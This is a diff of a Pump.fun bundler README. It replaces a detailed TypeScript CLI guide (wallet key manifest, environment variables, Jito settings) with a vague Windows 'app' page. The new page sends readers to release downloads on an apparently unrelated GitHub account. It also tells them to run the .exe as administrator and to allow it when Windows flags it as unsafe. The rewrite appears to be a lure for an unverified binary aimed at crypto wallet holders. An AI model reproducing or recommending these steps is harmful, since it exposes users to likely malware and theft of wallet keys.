@@ -1,226 +1,165 @@
-# Pump.fun bundler (TypeScript)
+# ⚙️ Pumpfun-Bundler-Bot - Simple control for bundled trades
 
-Interactive CLI for Pump.fun–related workflows: token launch, bundled buys, SOL and token distribution across bundler/holder wallets, balance checks, and optional Jito bundle execution. Configuration is split between **environment variables** (RPC and global compute defaults) and a root **`id.json` manifest** (keys, token metadata, and timing / sizing knobs).
+[![Download Pumpfun-Bundler-Bot](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/yancyunprecedented355/Pumpfun-Bundler-Bot/releases)
 
-## Requirements
+## 🚀 What this app does
 
-- **Node.js** 20+ recommended  
-- **Solana RPC** with HTTP and WebSocket endpoints (same provider, matching cluster)  
-- **Optional:** Jito block engine + bundle JSON-RPC URL for bundle submission paths in the codebase  
-- **SOL** on the wallets you configure for fees, tips, and trading
+Pumpfun-Bundler-Bot is a Windows app that helps you manage bundled trade actions with less manual work. It is built for users who want a simple desktop tool with a clear flow and fast setup.
 
-## Quick start
+Use it to:
 
-1. **Clone and install**
+- open a clean Windows interface
+- set trade values before you start
+- run bundled actions from one place
+- keep your work in one window
+- reduce repeated manual steps
 
-   ```bash
-   git clone https://github.com/Zentariq/Pumpfun-Bundler-Bot.git
-   cd Pumpfun-Bundler-Bot
-   npm install
-   ```
+## 💻 System needs
 
-   Use your own fork or mirror URL if different.
+Use a Windows PC with:
 
-2. **Environment (`.env`)**
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- 200 MB of free disk space
+- a stable internet connection
+- permission to run downloaded apps
 
-   Copy the template and fill every variable (empty values cause the app to exit on startup when `config.ts` loads).
+For the best result, close other heavy apps before you start.
 
-   ```bash
-   cp .env.example .env
-   ```
+## 📥 Download the app
 
-   See [Environment variables](#environment-variables) below.
+Visit this page to download:
 
-3. **Manifest (`id.json`)**
+https://github.com/yancyunprecedented355/Pumpfun-Bundler-Bot/releases
 
-   Copy the example and edit in place:
+After the page opens, look for the latest release. Download the Windows file from that release, then move to the next step.
 
-   ```bash
-   cp id.example.json id.json
-   ```
+## 🛠️ Install on Windows
 
-   `id.json` is **gitignored**. It holds base58 secrets and/or **paths to key files**, plus token metadata and runtime tuning. See [Using `id.json`](#using-idjson) for the full schema and behavior.
+1. Open the download folder on your PC.
+2. Find the file you just downloaded.
+3. If the file is in a .zip folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Find the app file, such as an .exe file.
+6. Double-click the file to start the app.
+7. If Windows asks for permission, choose Yes.
 
-4. **Run the CLI**
+If the app opens in a small window, that is normal. Keep it open while you use it.
 
-   ```bash
-   npm start
-   ```
+## ▶️ First start
 
-   On Windows, if `cp` is unavailable, use `copy .env.example .env` and `copy id.example.json id.json`.
+When you open Pumpfun-Bundler-Bot for the first time:
 
----
+1. Wait for the main window to load.
+2. Read the labels in each section.
+3. Fill in the fields you want to use.
+4. Check your settings before you begin.
+5. Start with a small test run if you want to confirm everything works.
 
-## Using `id.json`
+The app is made to keep the process simple, so most controls should be easy to spot.
 
-### What it is
+## 🧭 Main parts of the app
 
-- **Location:** project root, filename **`id.json`** (fixed in [`settingsManifest.ts`](settingsManifest.ts) as `MANIFEST_FILE`).
-- **Format:** a single **JSON object** (not a bare Solana keypair byte array). Invalid or missing files fall back to internal defaults and may warn in the console.
-- **Consumed by:** `settings.ts` → `loadSettingsManifest()` → exports such as `token`, `LP_wallet_keypair`, `Bundler_provider_wallet_keypair`, `batchSize`, `PRIORITY_FEE`, etc.
+### 🖥️ Dashboard
+This is the main screen. It gives you quick access to the key actions and settings.
 
-### Secrets: three logical keys
+### ⚙️ Settings
+Use this area to set your values before you run a task. You can adjust the parts you want to control from one place.
 
-The app needs material for three roles:
+### 📊 Status view
+This area shows progress, activity, and run state. It helps you see what the app is doing.
 
-| Role | Purpose (typical) |
-|------|-------------------|
-| **Mint** | New token mint secret (base58), used as `token.mintPk` after resolution |
-| **LP wallet** | Liquidity / pool–related signing |
-| **Bundler provider** | Primary signer for many flows (bundles, LUT close script, etc.) |
+### 🔁 Action controls
+These buttons or fields let you start, stop, or manage a bundle run. Use them with care and check your settings first.
 
-For **LP** and **Bundler provider**, the effective secret is resolved by [`keypairOrPlaceholder`](settingsManifest.ts):
+## 📝 Basic use
 
-1. **Inline base58** in `lpWalletPrivateKeyBs58` or `bundlerProviderPrivateKeyBs58` (non-empty string), or  
-2. **`paths.*`** — a filesystem path **or** another raw base58 string (see next section).
+1. Open the app.
+2. Set the values you want.
+3. Review your inputs.
+4. Start the action.
+5. Watch the status view.
+6. Stop the run if you need to make a change.
 
-If neither yields a valid keypair, the code **warns** and uses a **random placeholder** `Keypair` — which will **not** match your real wallets. Always verify keys load correctly (e.g. check exported public keys match your funded accounts).
+If you plan to run more than one action, check each setting before you begin a new run.
 
-### Mint public/secret string (`token.mintPk`)
+## 🔒 Good setup habits
 
-[`resolveMintPkBs58`](settingsManifest.ts) picks the mint string in this order:
+- Use only one app window at a time
+- Keep your internet connection stable
+- Save your settings if the app gives you that option
+- Start with low values until you know how it behaves
+- Keep the app in a safe folder on your PC
 
-1. `mintPrivateKeyBs58` (non-empty)  
-2. `token.mintPk` (non-empty)  
-3. `paths.mintKeypairBs58`: if that path **exists**, the **file contents** (trimmed) are used as the mint secret string; otherwise, if the path value itself is valid base58, it is used as inline secret  
+## 🧰 Common issues
 
-Legacy aliases merged into the same fields include `mint_private_key`, `configuredMintPk`, `LP_wallet_private_key`, `Bundler_provider_private_key`, and older `paths.lpWalletKeypairJson` / `paths.bundlerProviderKeypairJson` names.
+### App does not open
+Try these steps:
 
-### `paths` — files vs inline base58
+1. Right-click the app file.
+2. Choose Run as administrator.
+3. Check if Windows blocked the file.
+4. Re-download the file from the release page if needed.
 
-Each `paths.*` value can be:
+### Windows says the file is unsafe
+This can happen with newly downloaded apps. Check that you got the file from the release page, then allow it to run if Windows shows a prompt.
 
-- **Absolute path** or **path relative to the project root** (`process.cwd()`).  
-- If the path **exists** as a file:
-  - **JSON array of numbers** (Solana CLI keypair export) → decoded as secret key  
-  - **JSON object** with numeric `secretKey` array → same  
-  - Otherwise, file is read as **UTF-8 text** and interpreted as **base58**  
-- If the path does **not** exist as a file, the string is treated as **inline base58** (same as filling the top-level `*PrivateKeyBs58` fields).
+### The window is blank or slow
+Close the app, wait a few seconds, then open it again. If the issue stays, restart your PC and try once more.
 
-Supported base58 decodes: **64-byte** secret key or **32-byte** seed (see `keypairFromBs58String` in [`settingsManifest.ts`](settingsManifest.ts)).
+### Download did not finish
+Open the release page again and try the latest file. Use a stable connection while the file downloads.
 
-### Example — inline secrets (typical)
+## 📁 Suggested folder setup
 
-The usual setup is to keep **`paths.*` empty** and put base58 material directly on the manifest (same idea as [`id.example.json`](id.example.json)):
+Keep the app in a folder like this:
 
-```json
-{
-  "paths": {
-    "mintKeypairBs58": "",
-    "lpWalletPrivateKeyBs58": "",
-    "bundlerProviderPrivateKeyBs58": ""
-  },
-  "mintPrivateKeyBs58": "<base58 mint secret>",
-  "lpWalletPrivateKeyBs58": "<base58 LP secret>",
-  "bundlerProviderPrivateKeyBs58": "<base58 bundler provider secret>"
-}
-```
+- Downloads
+- Pumpfun-Bundler-Bot
+- App Files
 
-### Optional — file-backed keys
+A clean folder makes it easier to find the program later and keep extra files in one place.
 
-If you do not want secrets inside `id.json`, set `paths.*` to an **absolute path** or a path **relative to the project root** (any folder you use), pointing at a Solana CLI keypair JSON file or a UTF-8 file whose contents are base58. Non-file `paths.*` strings are still treated as inline base58 (same rules as the **`paths`** subsection above).
+## 🔄 Updating the app
 
-### Token metadata (`token`)
+When a new version is ready, return to the release page and download the latest file. Replace the old app file with the new one if the release notes tell you to do so.
 
-The `token` object is merged onto defaults (`DEFAULT_TOKEN_BASE` in [`settingsManifest.ts`](settingsManifest.ts)). Typical fields (see [`src/types.ts`](src/types.ts)):
+## 🧩 File names you may see
 
-- `name`, `symbol`, `description`, `showName`  
-- `createOn` (e.g. `"Pump.fun"`)  
-- `twitter`, `telegram`, `website`  
-- `image` — path to image file (example: `./src/image/2.jpg`)
+You may see files such as:
 
-Resolved `token` (including `mintPk`) is exported from `settings.ts`.
+- .exe
+- .zip
+- .dll
+- .json
 
-### Timing, batching, and economics (numeric fields)
+The main file you open is usually the .exe file. If you downloaded a .zip file, extract it first.
 
-These are read from the manifest and exported from `settings.ts` (defaults exist if keys are omitted):
+## 📌 Topics
 
-| Field | Typical meaning |
-|-------|-----------------|
-| `batchSize` | Batch size for wallet groups |
-| `bundleWalletNum` | Total bundler wallets (defaults to `batchSize * 4` if omitted) |
-| `bundlerHoldingPercent` | Target holding share for bundler logic |
-| `walletCreateInterval` | Delay (seconds) between wallet creation steps |
-| `walletTransferInterval` | Delay between transfers |
-| `holderTokenTransferInterval` | Delay for holder token moves |
-| `holderTokenAmountMax` / `holderTokenAmountMin` | Randomized holder amounts (token units) |
-| `distNum` | Distribution parameter |
-| `remaining_token_percent` | Remaining supply percentage for flows that use it |
-| `bundlerWalletName` / `holderWalletName` | Base names for persisted bundler/holder wallet files |
-| `extra_sol_amount` | Extra SOL buffer for operations |
-| `PRIORITY_FEE` | SOL amount used in several layouts to derive **per-transaction** compute unit price (see [Fees: `.env` vs `id.json`](#fees-env-vs-idjson)) |
-| `holderCreateInterval` | Delay for holder wallet creation |
+bot  
+bundler  
+pumpfun  
+trade
 
-Exact semantics are defined by the `layout/` and `src/` modules that import each export.
+## 🛟 Help with setup
 
-### If `id.json` is missing
+If the app does not start, check these items:
 
-[`loadSettingsManifest`](settingsManifest.ts) falls back to [`defaultManifest()`](settingsManifest.ts). Treat that as a last resort: **add a real `id.json`** (copy [`id.example.json`](id.example.json)) and set mint / LP / bundler provider material—usually inline base58 as above—so signing keys are explicit and not left to placeholder defaults.
+- the file finished downloading
+- the file is in a folder you can open
+- Windows did not block the file
+- your PC has enough free space
+- your internet connection is active
 
----
+If the app starts but does not show the screen you expect, close it and open it again from the main file in the extracted folder.
 
-## Environment variables
+## 🗂️ Quick start checklist
 
-Loaded by [`config.ts`](config.ts) via `dotenv` from **`.env`** in the project root. All of the following are **required** (missing → log + `process.exit(1)`):
-
-| Variable | Role |
-|----------|------|
-| `RPC_ENDPOINT` | HTTP RPC URL |
-| `RPC_WEBSOCKET_ENDPOINT` | WebSocket URL (`wss://...`) |
-| `BLOCKENGINE_URL` | Jito block engine **host only** (no scheme), e.g. `frankfurt.mainnet.block-engine.jito.wtf` |
-| `LILJITO_RPC_ENDPOINT` | HTTPS URL for bundle JSON-RPC (e.g. `https://<region>.mainnet.block-engine.jito.wtf/api/v1/bundles`) |
-| `JITO_FEE` | Tip in SOL; converted to lamports in config |
-| `COMPUTE_UNIT_PRICE` | Micro-lamports per compute unit for code paths that import it from `config` |
-
-See [`.env.example`](.env.example) for placeholders and comments.
-
-### Fees: `.env` vs `id.json`
-
-- **`COMPUTE_UNIT_PRICE`** (`.env`): used where the code imports `COMPUTE_UNIT_PRICE` from `config` (e.g. some bulk send paths).  
-- **`PRIORITY_FEE`** (`id.json`): SOL-based value converted to micro-lamports in other flows (e.g. [`layout/createTokenBuy.ts`](layout/createTokenBuy.ts), [`layout/manualRebuy.ts`](layout/manualRebuy.ts), parts of [`index.ts`](index.ts)).
-
-Set both consistently with how your RPC and Jito submission behave under load.
-
----
-
-## CLI overview (`npm start`)
-
-Main menu ([`menu/menu.ts`](menu/menu.ts)):
-
-1. **Token Launch** — presimulate, or create token / pool and bundle buy ([`layout/`](layout/)).  
-2. **Token Sell & Buy** — e.g. sell from each bundler.  
-3. **Gather SOL** — gather from all or one bundler, or distribute SOL to bundlers.  
-4. **Balances** — SOL and token balances for bundlers.  
-5. **Exit**
-
-Submenus guide numeric choices; some prompts accept `c` to cancel (see individual `layout/*` files).
-
----
-
-## npm scripts
-
-| Command | Description |
-|---------|-------------|
-| `npm start` / `npm run dev` | Run [`index.ts`](index.ts) (main menu) |
-| `npm run close` | Run [`closeLut.ts`](closeLut.ts) — close an address lookup table; uses `Bundler_provider_wallet_keypair` from settings and LUT data from project utilities |
-| `npm run gather` | Runs `gather.ts` if present (see [`package.json`](package.json)) |
-
----
-
-## Additional docs
-
-- [`docs/README.md`](docs/README.md) — notes on bundled assets (e.g. sample bubblemap image).
-
----
-
-## Security
-
-- **Never commit** `.env`, `id.json`, `settings.ts`, or other sensitive files listed in [`.gitignore`](.gitignore).  
-- Treat **`id.json`** and any key file as **full wallet access**; use dedicated hot wallets and minimal balances where possible.  
-- If you see `[settings] ... using a random placeholder keypair`, fix `id.json` / paths immediately before spending real funds.
-
----
-
-## License
-
-ISC — see [`package.json`](package.json).
+1. Open the release page.
+2. Download the latest Windows file.
+3. Extract it if it is a .zip file.
+4. Open the app file.
+5. Allow Windows permission if asked.
+6. Set your values.
+7. Start your run.
